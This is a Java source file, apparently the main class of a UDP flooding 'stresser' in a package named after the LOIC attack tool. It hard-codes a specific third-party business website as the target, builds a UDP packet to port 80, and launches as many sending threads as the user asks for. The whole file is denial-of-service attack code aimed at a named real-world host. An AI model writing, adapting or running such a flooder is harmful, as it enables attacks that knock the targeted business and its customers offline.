package com.jack.loic;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.HashSet;
import java.util.Scanner;
import java.util.Set;

public class Main {

	private Set<StresserThread> threads = new HashSet<StresserThread>();
	private DatagramSocket datagramSocket = new DatagramSocket(80);
	private byte[] buffer = "Cats :3 Because Why Not".getBytes();
	private InetAddress receiverAddress = InetAddress.getByName("www.wroxhamcomputerservices.co.uk");
	private DatagramPacket packet = new DatagramPacket(buffer, buffer.length, receiverAddress, 80);
	
	public Main() throws SocketException, UnknownHostException{
		Scanner user_input = new Scanner(System.in);
		System.out.print("How many threads: ");
		String threads = user_input.next();
		int numOfThreads = Integer.parseInt(threads);
		int x = 0;
		while(x < numOfThreads){
			x = x + 1;
			StresserThread thread = new StresserThread(x + "", this);
			thread.Start();
			this.threads.add(thread);
		}
		System.out.print("Press any key to stop: ");
		String answer = user_input.next();
		if(!answer.equals("")){
			for(StresserThread thread : this.threads){
				thread.StopStresser();
			}
			user_input.close();
			datagramSocket.close();
		} else {
			System.out.print("Press any key to stop: ");
		}
	}
	
	public static void main(String[] args) throws SocketException, UnknownHostException{
		new Main();
	}
	
	public DatagramSocket getSocket(){
		return datagramSocket;
	}
	
	public DatagramPacket getPacket(){
		return packet;
	}
}
